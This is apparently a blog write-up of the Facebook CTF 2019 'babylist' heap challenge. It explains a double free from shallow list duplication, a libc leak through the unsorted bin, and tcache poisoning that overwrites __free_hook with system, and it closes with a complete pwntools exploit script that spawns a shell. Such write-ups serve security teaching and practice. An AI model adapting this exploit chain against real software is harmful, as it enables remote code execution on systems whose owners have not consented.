---
layout: post
cover: 'assets/images/cover8.jpg'
navigation: true
title: 'Facebook CTF 2019 - babylist'
date: 2019-06-03
tags: pwnable writeup
subclass: 'post'
logo: 'assets/images/ghost.png'
author: lanphere
categories: lanphere
disqus: true
---

This challenge is c++ binary.

```
$$$$$$$$$$$$$$$$$$$$$$$$$$
Welcome to babylist!
$$$$$$$$$$$$$$$$$$$$$$$$$$

1. Create a list
2. Add element to list
3. View element in list
4. Duplicate a list
5. Remove a list
6. Exit
>
```
It looks like heap challenge. List structure is as follows.

```
typedef list {
  char name[0x70];
  int *start; /* address of the first element in array */
  int *last;  /* address of the last element in array */
  int *limit; /* end of allocated array */
} List;
```

start, last, limit pointers points address of memory that is dynamically allocated.
When we add a element to list, the element added to array and last pointer is increased by 4(size of element).

When we add first element to list, the start pointer is initialized via `operator new(4)`. and internally(in binary)
it can store only one element. Each time the array is full, existing array is freed(deleted) and new array is allocated.
The size of array gets doubled each time.

Third menu 'View' has nothing special. Duplicating list literally copies a list. But an interesting point is that it
doesn't allocate new array and copies, instead copies start, last, limit pointer. So it can happen that
1. Make an list named A. Add elements until array in the list gets full.
2. Duplicate that list. Let's call duplicated list B.
3. Add a element in A. Then A gets newly allocated array(start, last, limit).
4. Array that B has is freed memory.

Also if we add a element in B, array that B has is again freed(double free). We can use this vulnerability later in exploit.
To leak the address of libc,
1. Make a list. and add elements until the size of array becomes large enough(larger than 0x80, which is fastbin chunk).
2. Add elements so that array gets full.
3. Duplicate the list 8 times.
4. Add a elements in each list except the the last list.
    - The same array is freed 8 times.
    - Binary uses glibc 2.27 which implements tcache. With first 7 frees, tcache gets saturated.
    - The last eighth free puts the chunk into unsorted bin.
5. View the value of first, second elements in 9th list.
    - Array of 9th list is pointer of freed chunk in unsorted bin.
    - First, second bytes are the address of somewhere in main_arena
    - We can get base address of libc.

After libc leak, the exploit scenario is as follows.
1. Make a list and add elements until the size of array becomes 0x91(including chunk header)
    - The reason we do this step is 0x91 is the same as the size of 'list' structure.
2. Duplicate this list 2 times.
3. Add a element in two lists.
    - Array is double freed. (tcache -> p -> p)
4. Make a list with its name value of address of __free_hook. (tcache -> p)
5. Make a list with its name value of "/bin/sh\x00". (tcache -> __free_hook)
    - Array of third list is '/bin/sh\x00'
    - Let's call this array A.
6. Make a list with its name value of address of system
    - __free_hook is allocated.
7. Add a element in 3rd list.
    - A is freed. That is, free(A)
    - __free_hook is overwritten with system and A has "/bin/sh"
    - free(A) is system("/bin/sh");
8. Get shell!

```
from pwn import *

bin = ELF('./babylist')
libc = ELF('./libc-2.27.so', checksec=False)

LOCAL = False

one_gadget_offset = [0x4f2c5, 0x4f322, 0x10a38c]


def create_list(name):
    conn.sendlineafter('> ', str(1))
    conn.sendlineafter('name for list:\n', name)
    conn.recvuntil('List has been created!\n')


def add_element(idx, num):
    conn.sendlineafter('> ', str(2))
    conn.sendlineafter('Enter index of list:\n', str(idx))
    conn.sendlineafter('Enter number to add:\n', str(num))
    conn.recvuntil('Number successfully added to list!\n')


def view_element(list_idx, idx):
    conn.sendlineafter('> ', str(3))
    conn.sendlineafter('Enter index of list:\n', str(list_idx))
    conn.sendlineafter('Enter index into list:\n', str(idx))


def duplicate_list(idx, name):
    conn.sendlineafter('> ', str(4))
    conn.sendlineafter('Enter index of list:\n', str(idx))
    conn.sendlineafter('Enter name for new list:\n', name)
    conn.recvuntil('List has been duplicated!\n')


def remove_list(idx):
    conn.sendlineafter('> ', str(5))
    conn.sendlineafter('Enter index of list:\n', str(idx))
    conn.recvuntil('List has been deleted!\n')


if LOCAL:
    conn = process('./babylist', env={'LD_PRELOAD': './libc-2.27.so'})
    gdb.attach(conn)
else:
    conn = remote('challenges.fbctf.com', 1343)

# Stage 1: Libc Leak
create_list('AAAAAAAA')

for i in range(64):
    log.info(str(i))
    add_element(0, 1)

for i in range(8):
    duplicate_list(0, 'BBBBBBBB')

for i in range(8):
    add_element(i, 1)

view_element(8, 0)

conn.recvuntil('BBBBBBBB[0] = ')
lower = conn.recvuntil('\n')[:-1]
if lower.startswith('-'):
    lower = ~int(lower[1:]) + 1
else:
    lower = int(lower)

view_element(8, 1)
conn.recvuntil('BBBBBBBB[1] = ')
higher = int(conn.recvuntil('\n')[:-1]) + 1

libc_addr = (higher << 32) + lower - 0x3ebca0
log.info('Libc_addr: ' + hex(libc_addr))
log.info('One_gadget_addr: ' + hex(libc_addr + one_gadget_offset[1]))

# Stage 2
for i in range(9):
    remove_list(i)

create_list('CCCCCCCC')  # 0

for i in range(32):
    add_element(0, 1)

duplicate_list(0, 'DDDDDDDD')  # 1
duplicate_list(0, 'DDDDDDDD')  # 2

add_element(0, 1)
add_element(1, 1)

create_list(p64(libc_addr + libc.symbols['__free_hook']))
create_list('/bin/sh\x00')
create_list(p64(libc_addr + libc.symbols['system']))

conn.sendlineafter('> ', str(2))
conn.sendlineafter('Enter index of list:\n', str(2))
conn.sendlineafter('Enter number to add:\n', str(1))

conn.interactive()
```